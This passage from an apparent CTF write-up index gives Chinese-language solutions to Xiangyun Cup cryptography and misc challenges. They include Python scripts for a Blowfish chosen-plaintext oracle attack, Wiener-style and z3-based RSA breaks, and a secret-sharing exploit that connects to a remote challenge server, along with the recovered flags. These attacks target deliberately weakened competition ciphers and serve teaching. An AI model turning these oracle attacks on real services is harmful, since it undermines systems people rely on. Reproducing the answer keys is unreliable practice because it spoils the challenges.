s1)\npart = re_res.group(1)\nhash_value = re_res.group(2)\nprint 'part:', part\nprint 'hash_value:', hash_value\nnonce = PoW(part, hash_value)\nprint 'nonce:', nonce\nsh.sendline(nonce)\n\n_ = [sh.recvline() for i in range(8)]\n\ns1 = sh.recvline()\ns1 = base64.b64decode(s1)\niv, c = s1[:8], s1[8:]\nprint len(iv)\nprint len(c)\nd_c1 = xor('Blowfish', iv)\nnew_iv = xor(d_c1, 'get_flag')\nget_flag = base64.b64encode(new_iv + c)\nprint get_flag\n\nflag = ''\nalphabet = 'flag{}-0123456789abcdef'\n# alphabet = string.printable\nfor i in range(42):\n    sh.sendline(get_flag)\n    target_m = ('x' * (47 - i))\n    sh.sendline(target_m)\n    target_c = base64.b64decode(sh.recvline())\n    for x in alphabet:\n        sh.sendline(get_flag)\n        test_m = ('x' * (47 - i)) + flag + x\n        sh.sendline(test_m)\n        test_c = base64.b64decode(sh.recvline())\n        if test_c[:48] == target_c[:48]:\n            flag += x\n            print '[%02d/42] %s' % (i+1, flag)\n            break\nsh.interactive()\n</code></pre> <p></p>"},{"location":"Writeup/Cryptography/blowfishgame/#flag","title":"Flag","text":"<p>flag{ba524422-7769-4d00-bd4d-6d6946c173ce}</p>"},{"location":"Writeup/Cryptography/blowfishgame/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Cryptography/more_calc/","title":"more_calc","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 25</p>"},{"location":"Writeup/Cryptography/more_calc/#description","title":"Description","text":"<p>maybe u need more cpu</p>"},{"location":"Writeup/Cryptography/more_calc/#solution","title":"Solution","text":"<pre><code>import gmpy2\nfrom Crypto.Util.number import *\n\n\nflag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"\n\n\np = getStrongPrime(2048)\nfor i in range(1, (p+1)//2):\n    s += pow(i, p-2, p)\ns = s % p\nq = gmpy2.next_prime(s)\nn = p*q\ne = 0x10001\nc = pow(bytes_to_long(flag), e, n)\nprint(p)\nprint(c)\n#27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069\n#35055918683748883282174784323651813560520737603185800227424500428762264933021511381871995418539707283801414497303232960090541986190867832897131815320508500774326925395739528242032566313216102210036548100374594081897428098804503420454038574457280610255242042832626554192534670284369336699175346822030007088865173250252079700270724860427575514471342164997149244044205247072315311115645755855836214700200464613652201134426101746190195358346246762242881016710707928119020973125199597600335220176686188732073999025860155060600538887296782517962617671450347555788381054344555539001456268680189452831160062315698482986474322296387716709989292671747978922668181058489406663507675599642320338049377613048817085979874567772781052867215035033348050642450667612710852648837001109914769887507004392552421783737965416800917979813137835262317794775319294801257483177741372991005066875900770459644762548438474388076655842822437141772648037236281057239552272508379892613346840960049192531743799845858272389712078645821963027561694961956409973354276629777068204456160534409039477757097372521171307620184694243888389707840806777932547158990704118642378158004690358831695861544319681913385236756504946707671037639508589887549565323717819837942112908652\n</code></pre> <p>\u60f3\u6c42q\uff0c\u5f97\u5148\u6c42s\uff0c\u53c8\u56e0\u4e3as\u662f pow(i, p-2, p) \u7684\u7d2f\u548c( i \u4ece1\u5230 (p+1)//2 )\uff0c\u53ef\u4ee5\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6c42p \u548c (p+1)//2 -1 \u6c42\u9006\u5143</p> <pre><code># -*- coding: utf-8 -*-\n# @Project: Hello Python!\n# @File   : exp\n# @Author : Tr0jAn &lt;Tr0jAn@birkenwald.cn&gt;\n# @Date   : 2020-11-22\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\np = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069\ns = gmpy2.invert(p, (p+1)//2-1)\ns = s % p\nq = gmpy2.next_prime(s)\ne = 0x10001\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nn = p*q\nc = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Writeup/Cryptography/more_calc/#flag","title":"Flag","text":"<p>flag{3d7f8da9-ee79-43c0-8535-6af524236ca1}</p>"},{"location":"Writeup/Cryptography/more_calc/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Cryptography/myRSA/","title":"myRSA","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 15</p>"},{"location":"Writeup/Cryptography/myRSA/#description","title":"Description","text":"<p>\u6211\u7684\u7b2c\u4e00\u6b21\u5bc6\u7801\u5b66\u5bfc\u8bba\u4f5c\u4e1a, \u53c2\u6570\u7684\u751f\u6210\u5927\u5bb6\u89c9\u5f97\u600e\u6837\u5462\uff1f<code>nc 0.cloud.chals.io 33723</code></p> <p> myRSA.zip</p>"},{"location":"Writeup/Cryptography/myRSA/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u8fd9\u9898oracle\u7b49\u5f88\u4e45\u624d\u80fd\u751f\u6210\u6570\uff08\u5f71\u54cd\u4e86\u6211\u62a2\u4e00\u8840\u7684\u901f\u5ea6\uff09\u9700\u8981\u8010\u5fc3\u7b49\u5f85\u3002</p> <p>\u9898\u76ee\u57fa\u4e8eRSA\uff0c\u4e3a1024\u4f4d\u6570\uff0c\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e3a</p> <p></p> <p></p> <p></p> <p>\u5927\u6982\u4e3a1024\u4f4d\u6570</p> <p></p> <p>\u9898\u76ee\u7ed9\u51fa\u548cflag\u7684\u5bc6\u6587\u3002\u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u660e\u6587\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u6587\u3002</p>"},{"location":"Writeup/Cryptography/myRSA/#_2","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u6ce8\u610f\u5230</p> <p></p> <p>\u4e5f\u5c31\u662f</p> <p></p> <p>\u7136\u540e\u53ef\u4ee5\u770b\u6210\u662f\u5bf9\u7684\u5e26\u4f59\u9664\u6cd5\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u6b65\u7684\u5bf9\u5e94\u7684\uff08\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u8ba1\u7b97\u51fa\u6765\uff09\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7684\u503c\u3002\u7136\u540e\u5bf9\u5f00\u4e09\u6b21\u65b9\u53ef\u4ee5\u5f00\u51fa\u6765\u3002</p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408\uff0c\u7528<code>z3-solver</code>\u89e3\u51fa\u548c\u3002</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u548c\u7684\u503c\uff0c\u5e76\u4e14\u5229\u7528\u9664\u4ee5\u5f97\u5230RSA\u7684\u5bc6\u6587\uff0c\u7136\u540e\u89e3RSA\u5373\u53ef\u3002</p> <p>\u8fc7\u6389oracle\u7684proof of work\u68c0\u6d4b\uff0c\u7136\u540e\u7b49\u51e0\u5206\u949f\uff0c\u62ff\u5230\u548c\uff0c\u7136\u540e\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a<code>1</code>\u5f97\u5230\u5bc6\u6587\u3002\u5c06\u5f97\u5230\u7684\u503c\u8f93\u5165\u4ee3\u7801\uff1a</p> <pre><code>import gmpy2\nfrom z3 import *\nfrom Crypto.Util.number import *\n\nn = 121642065448176156473897179092419728921875357974980389083860655277565704825649889226444419608980002630759091596085557548487575346914669740739314941122290996740304245650872046561895900796258456608793055028467475091633433839705791878132565383650206725088639081180463351423103722622744738467167869749662990688979\n\ncc = 1136361046033913612036332714569670427841256258685140344055068620567475033294018028371032984703266206522526501010193123738345243273176762739282234315795608086725508770575402683003031958708516685141549840548134463272675351840929630389108825535204457117771682170437521557495770971608166831028637021920921360209937746104425491678161944802864369442195541546254091075147348470471884402144293370533562623258123204821582501280968271504384904817447094261612944693686431804933040510678517012219972815762511119200409624840705484711608894758448331870766284821627574717762202817452703132562199236232290523206855898302762507824719214766649522917767889370878378892167034276829407953963424463895887129146755081368470643425950316309913064297742492397168974520285387936917948771030039018332\n\ncf = 295318431540053515087200928667285571195873544800963850029171139457738083432353682348226869156528183688490148373759627896871330766900837785451589779523111914618842905371837548861785389600883467087532763343406914524095383977741052854917948885361134719361023858033122670278053750085303927034983764865067526075420830992291379676788114928196956733017730193604813935484846679831060231258082875209851746699146625709301590969332851864108352895567376700175971571387738401144667542370193792481515722502753499780996972280714436836825211823165098486303895898784162737206171512239610585374041011016685047322413395385902117183922652085520924218305511771316307760747269759565922379004659918873467812356832776152950611990185909516951703495925411981576965707961331962771430522666692227338\n\nm = 49\ne = 0x10001\nc = pow(m, e, n)\ncc = cc // c\nmy = cc - 4 * n\n\nmy1, ok = gmpy2.iroot(my, 3)\n\np, q = Ints('p q')\nsol = Solver()\nppq = int(ppq)\nsol.add(p + q == ppq)\nsol.add(p * q == n)\nif (sol.check() == sat):\n    m = sol.model()\n    p = m[p].as_long()\n    q = m[q].as_long()\n    x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) \n    y = 2*p*q + p + q\n    cf = cf // (x + y)\n    mf = pow(cf, inverse(e, (p-1)*(q-1)), n)\n    print(long_to_bytes(mf))\nelse:\n    print('GG simida')\n</code></pre>"},{"location":"Writeup/Cryptography/myRSA/#flag","title":"Flag","text":"<pre><code>flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1}\n</code></pre>"},{"location":"Writeup/Cryptography/myRSA/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402690414</p>"},{"location":"Writeup/Cryptography/secret%20share/","title":"secret_share","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 35</p>"},{"location":"Writeup/Cryptography/secret%20share/#description","title":"Description","text":"<p>Here is running a secret sharing system. But if the server colludes with some clever users, the whole system will not be safe any more.<code>nc 0.cloud.chals.io 19892</code></p> <p> secret_share.zip</p>"},{"location":"Writeup/Cryptography/secret%20share/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u8981\u7528python 2\u8fd0\u884c\u670d\u52a1\u7aef\u4ee3\u7801\u3002</p> <p>\u9898\u76ee\u57fa\u4e8e\u79bb\u6563\u5bf9\u6570\uff0c\u4e5f\u5c31\u662f\uff0c\u751f\u6210\u5143\u548c\u6a21\u7d20\u6570\u5728\u4ee3\u7801\u4e2d\u7ed9\u51fa\u3002</p> <p>\u9898\u76ee\u7684\u52a0\u5bc6\u5982\u4e0b\uff1a\u4ea7\u751f\u968f\u673a\u7684\uff0c\u8ba1\u7b97</p> <p></p> <p></p> <p></p> <p>\u4ea7\u751f\u7684\u5bc6\u6587\u4e3a\u3002</p> <p>\u5e76\u4e14\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u4e8c\u6b21\u52a0\u5bc6\uff1a</p> <p></p> <p></p> <p>\u4ea7\u751f\u7684\u5bc6\u6587\u4e3a</p> <p>\u4e00\u5f00\u59cboracle\u7ed9\u51fa\u4e00\u5bf9\uff0c\u4f46\u662f\u6211\u4eec\u5bf9flag\u52a0\u5bc6\u6240\u7528\u7684\u4e3a\u3002\u6211\u4eec\u80fd\u77e5\u9053flag\u5bf9\u5e94\u5bc6\u6587\u3002\u53ef\u4ee5\u5f97\u5230\u66f4\u591a\u63d0\u793a\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u8fc7\u5982\u4e0b\u6311\u6218\uff1a</p> <p>oracle\u6bcf\u6b21\u751f\u6210\u4e00\u4e2a200\u4f4d\u7684\uff0c\u7136\u540e\u8fdb\u884c\u4e00\u4e2a<code>rk_gen</code></p> <p><code>rk_gen</code>\u662f\u4e00\u4e2a\u591a\u9879\u5f0f\u751f\u6210\uff0c\u4e00\u5f00\u59cb\u751f\u6210\u4e00\u4e2a\uff0c\u8bb0\uff0c\u5bf9\u3002</p> <p>\u8fd9\u91cc\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u7684\u503c\u8ba9\u6211\u4eec\u77e5\u9053\u3002</p> <p>\u5bf9<code>encoder</code>\u89c2\u5bdf\u5f97\uff1a</p> <p>\u4e00\u5f00\u59cb\u662f</p> <p>\u7b2c\u4e00\u56de\u5c31\u53d8\u6210\u4e86</p> <p>\u7b2c\u4e8c\u56de\u5c31\u53d8\u6210\u4e86</p> <p>\u89c2\u5bdf\u4e0e\u5f52\u7eb3\u53d1\u73b0\u4e4b\u540e\u4e5f\u6ee1\u8db3\u8fd9\u6837\u7684\u5f62\u5f0f\u3002</p> <p>\u7531\u97e6\u8fbe\u5b9a\u7406\uff0c\u4e0a\u9762\u7684\u4e5f\u5c31\u53ef\u4ee5\u770b\u6210\u662f\u591a\u9879\u5f0f\u7684\u5c55\u5f00\u5f0f\u4e4b\u7cfb\u6570\u3002</p> <p>\u5e76\u4e14\u5b9e\u9645\u7ed9\u6211\u4eec\u7684\u65f6\u5019\uff0c\u6211\u4eec\u77e5\u9053\u7684\u662f</p> <p></p> <p>\u7136\u540e</p> <p></p> <p></p> <p>\u5e76\u4e14\u628a\u7528\u52a0\u5bc6\u540e\uff0c\u518d\u5229\u7528\u8fd9\u91cc\u7b97\u51fa\u6765\u7684\u8fdb\u884c\u4e8c\u6b21\u52a0\u5bc6\u4e4b\u540e\u7684\u7ed3\u679c\u544a\u8bc9\u6211\u4eec\u3002\u9700\u8981\u6211\u4eec\u7ed9\u51fa\u7684\u503c\u3002</p> <p>\u5982\u679c4\u6b21\u6311\u6218\u6210\u529f\uff0c\u90a3\u4e48oracle\u63d0\u793a\u6211\u4eec\u8fd94\u6b21\u6240\u4ea7\u751f\u7684\u503c\u4e4b\u79ef\u3002</p>"},{"location":"Writeup/Cryptography/secret%20share/#_2","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u9996\u5148\u6211\u4eec\u6765\u770b\u8fd9\u4e2a\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\uff1a\u5047\u8bbe\u6211\u4eec\u6709\u7684\u8bdd\uff0c\u5bc6\u6587\u53ef\u4ee5\u88ab\u5199\u6210</p> <p></p> <p>\u6240\u4ee5</p> <p></p> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u89e3\u5f97\u660e\u6587\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u6311\u6218\u3002\u5b9e\u9645\u4e0a\uff0c\u6311\u6218\u5916\u90e8\u53ea\u6709\u548c\u53c2\u4e0e\u4e86\u8fd0\u7b97\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u6c42\u51fa\u6311\u6218\u4e2d\u7684\u3002</p> <p>\u5148\u5bf9\u4e8c\u6b21\u52a0\u5bc6\u7684\u7ed3\u679c\u8fdb\u884c\u5206\u6790\uff1a</p> <p></p> <p></p> <p></p> <p></p> <p>\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u77e5\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6a21\u7684\u9636\u4e3a\u8fd9\u4e00\u6027\u8d28\uff0c\u6c42\u51fa\u548c\uff0c\u8fdb\u800c\u6839\u636e\u4e0a\u9762\u5bc6\u7801\u7cfb\u7edf\u7684\u89e3\u5bc6\u6b65\u9aa4\u89e3\u51fa\u660e\u6587\uff0c\u5b8c\u6210\u6311\u6218\u3002</p> <p>\u53c8\uff0c\u8fd9\u91cc\u6211\u4eec\u662f\u77e5\u9053\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u6c42\u7684\u503c\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c</p> <p></p> <p>\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u4e5f\u662f\u5df2\u77e5\u7684\u3002\u90a3\u4e48\u76f8\u5f53\u4e8e\u8bf4\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u4e00\u4e2a\u591a\u9879\u5f0f\u3002</p> <p>\u90a3\u4e48\u6a21\u7684\u503c\u5c31\u662f\uff01</p> <p>\u5230\u8fd9\u91cc\uff0c\u6311\u6218\u89e3\u51b3\uff1a\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa\uff0c\u8fdb\u800c\u7b97\u51fa\u5e76\u89e3\u5bc6\u51fa\uff0c\u5b8c\u6210\u6311\u6218\u3002</p> <p>\u800c\u6311\u6218\u9001\u6211\u4eec\u7684\u5956\u52b1\u4e5f\u5c31\u662f\u56db\u4e2a</p> <p></p> <p>\u7684\u4e58\u79ef\uff0c\u800c\u8fd9\u91cc\u662f\u4e0d\u53d8\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7b97\u51fa\uff0c\u7136\u540e\u6a21\u610f\u4e49\u4e0b\u89e3\u65b9\u7a0b\u5f97\u5230\uff0c\u8fdb\u800c\u5bf9flag\u5bf9\u5e94\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u5373\u53ef\u3002</p> <p>\u641e\u5230\u63d0\u793a\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code># sage -python gao_2.py\nfrom pwn import *\nfrom sage.all import *\nfrom Crypto.Util.number import *\nfrom hashlib import sha256\n\ndef h2(m):\n    return int(sha256(m).hexdigest(), 16)\n\np = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3\ng = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577\n\nconn = remote('47.104.85.225', 62351)\nconn.sendlineafter('choice&gt;', '1')\nconn.recvuntil('Please take good care of it!\\n')\ns = conn.recvline()\ny, x = eval(s)\n\nconn.sendlineafter('choice&gt;', '2')\nnlist = [33, 65, 129, 257]\n\nfor n in nlist:\n    # n = 33 # 33\n    conn.recvuntil('The cipher shared to you\\n')\n    s = conn.recvline()\n    c, (EE, VV, sr) = eval(s)\n    conn.recvuntil('prefix, encoder = ')\n    s = conn.recvline()\n    encoder, prefix_hex = eval(s)\n    prefix = int(prefix_hex, 16)\n    Y0 = pow(prefix, x, p)\n\n    P, (xx, ) = PolynomialRing(Zmod(p), 'xx').objgens()\n    f1 = xx ** n\n    for i in range(n):\n        f1 += xx ** (n-i-1) * encoder[i]\n\n    f2 = xx - Y0\n    ff = f1 % f2\n    r = int(ff)\n    d = h2(prefix_hex.decode('hex') + long_to_bytes(r).rjust(64, '\\x00')) | 1\n    print(d)\n\n    d2 = inverse(d, p-1)\n    yev = pow(EE * VV, d2, p)\n    m = c * inverse(yev, p) % p\n    conn.sendline(hex(m)[2:])\n\nconn.interactive()\n</code></pre> <p>\u7136\u540e\u5f97\u5230\u63d0\u793a\u548c\u5bc6\u6587\u3002\u89e3\u5bc6\u7684\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from Crypto.Util.number import *\n\np = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3\ng = 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577\n\nc, (E, V, s) = (5585968041074025086153882651703151644252825797961750029846368850560274818374166788547796736374559756281986206108084144666719010198655069698311903223194165L, (7907022716121671499111670222633646508450620325985407809966619468858884394742418166662560533967841329320157194633470489479583638083109335158547004325407745L, 8405942693799264870593925170154538171389476686350775031149946204774020645560022720688012855017145834685204712310735071692308136544637274001444374071172215L, 4472917796572038030768951841580005906571419088430724545004411546215611452075638469061832923050311132351135006369648270174176244462571628294865215006848977L))\n\ndlist = [88705054545798462592463535140496546230654103298029754196033655251576954884967,\n3171548216431031323271233816116991780227219532639047192797048831559660952785,\n115398379312678080372309706872824527861787247942202400632537054143103194010615,\n85791902547465660732182842994118602329957914363880964530800626818535559558315]\n\nrs = 0x17be2ea8187855e3a4ff52657728c70efa4d8d51a9afb3a59fceb1ef85b377613f0271008951a7fcdf741a97892ec4a61c724e49ddb7d46b0e735448d35a1f29L\n\nZp = Zmod(p)\n\nd = Zp(1)\nfor x in dlist:\n    d *= x\n\nrs = Zp(rs)\ns = rs * d ^ -1\n\nP.&lt;x&gt; = PolynomialRing(Zp)\nf = x^4 - s\nfr = f.roots()\n\nc, E, V = map(Zp, (c, E, V))\n\nfor x1, po in fr:\n    x1 = int(x1)\n    yev = (E * V) ^ x1\n    m = c * yev ^ -1\n    m = int(m)\n    print(long_to_bytes(int(m)).encode('hex'))\n</code></pre>"},{"location":"Writeup/Cryptography/secret%20share/#flag","title":"Flag","text":"<pre><code>flag{504d0411-6707-469b-be31-9868200aca95}\n</code></pre>"},{"location":"Writeup/Cryptography/secret%20share/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402690414</p>"},{"location":"Writeup/Cryptography/simpleRSA/","title":"simpleRSA","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 15</p>"},{"location":"Writeup/Cryptography/simpleRSA/#description","title":"Description","text":"<p>Familiar and simple rsa</p>"},{"location":"Writeup/Cryptography/simpleRSA/#solution","title":"Solution","text":"<pre><code>from Crypto.Util.number import *import gmpy2\n\np, q, r = [getPrime(512) for i in range(3)]\nn = p * q * r\nphi = (p - 1) * (q - 1) * (r - 1)\nd = getPrime(256)\ne = gmpy2.invert(d , phi)\n\nflag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"\n\nc = pow(bytes_to_long(flag), e, n)\n\nprint(e, n)\nprint(c)\n</code></pre> <p>\u4e09\u7d20\u6570\u7684RSA\uff0c\u66fe\u7ecf\u67d0\u4e2a\u6bd4\u8d5b\u8fd8\u8003\u8fc7\u56db\u7d20\u6570\u7684\u3002\u5176\u52a0\u5bc6\u65b9\u5f0f\u548c\u5e38\u89c4RSA\u57fa\u672c\u4e00\u81f4\u76f8\u540c</p> <pre><code># -*- coding: utf-8 -*-\nfrom Crypto.Util.number import long_to_bytes\ne = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679\nn = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173\nc = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452\n\n\ndata = []\nwhile n:\n    data += [e // n]\n    e, n = n, e % n\nfor i in range(1, len(data) + 1):\n    e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679\n    n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173\n    data1 = data[:i]\n    d = 0\n    d1 = 1\n    for j in data1[::-1]:\n        d, d1 = d1, d + j * d1\n    if b'flag' in long_to_bytes(str(pow(c, d, n))):\n        print(long_to_bytes(str(pow(c, d, n))))\n</code></pre> <p></p>"},{"location":"Writeup/Cryptography/simpleRSA/#flag","title":"Flag","text":"<p>flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc}</p>"},{"location":"Writeup/Cryptography/simpleRSA/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/","title":"ChieftainsSecret","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 10</p>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#description","title":"Description","text":"<p>Our agent risked his life to install a mysterious device in the immemorial telephone, can you find out the chieftain's telephone number? Flag format: flag{11 digits}</p> <p> ChieftainsSecret.zip</p>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u56fe\u79cd\uff0c\u89e3\u538b\u5f97\u5230\u4e00\u4e2a\u7535\u8def\u56fe\u548c\u4e24\u5343\u591a\u7ec4\u6570\u636e\u3002</p>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#misc","title":"Misc\u4eb2\u7239\u7684\u89e3\u7b54","text":"<p>\u7ed3\u5408\u56fe\u7247\u63a8\u65ad\u8fd9\u662f\u8f6c\u52a8\u7801\u76d8\u7684\u8fc7\u7a0b\u8bb0\u5f55\uff0c\u67e5\u9605\u6587\u6863\u53ef\u5f97\u5230\u4e00\u7cfb\u5217\u6bcf\u6b21\u7801\u76d8\u8f6c\u52a8\u7684\u5ea6\u6570\u3002</p> <p>\u6570\u636e\u53ef\u8fdb\u884c\u5904\u7406\uff0c\u5f97\u5230sin\u503c\u4e0ecos\u503c\uff1a</p> <pre><code>def get_sin(i):\n    return (data['PC0'][i] - (data['PC0'][i] + data['PC1'][i]) / 2) / 1000\ndef get_cos(i):\n    return (data['PC2'][i] - (data['PC2'][i] + data['PC3'][i]) / 2) / 1000\n</code></pre> <p>\u5e76\u7ed8\u56fe\uff1a</p> <p>\u5927\u6982\u5c31\u662f\u62a0\u51fa\u5cf0\u503c</p> <p>\u6b63\u5f26\u548c\u4f59\u5f26\u7b97\u51fa\u540e\u5f97\u5230\u4e00\u4e2a\u7a7a\u95f4\u5750\u6807\u5206\u5e03</p> <pre><code>_map = '1234567890'\nps = [3, 3, 0, 2, 5, 1, 4, 9, 6, 5, 3]\nprint(''.join([_map[i] for i in ps]))\nprint(''.join([_map[::-1][i] for i in ps]))\nps = [3, 3, 0, 2, 5, 1, 4, 8, 6, 5, 3]\nprint(''.join([_map[i] for i in ps]))\nprint(''.join([_map[::-1][i] for i in ps]))\n</code></pre>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#flag","title":"Flag","text":"<pre><code>flag{77085962457}\n</code></pre>"},{"location":"Writeup/General%20Skills/ChieftainsSecret/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402713931</p>"},{"location":"Writeup/General%20Skills/shuffle_code/","title":"shuffle_code","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 45</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#description","title":"Description","text":"<p>_shuffle_code.zip</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9898\u76ee\u9644\u4ef6\u7ed9\u51fa\u6765\u7684\u62d6\u5165010 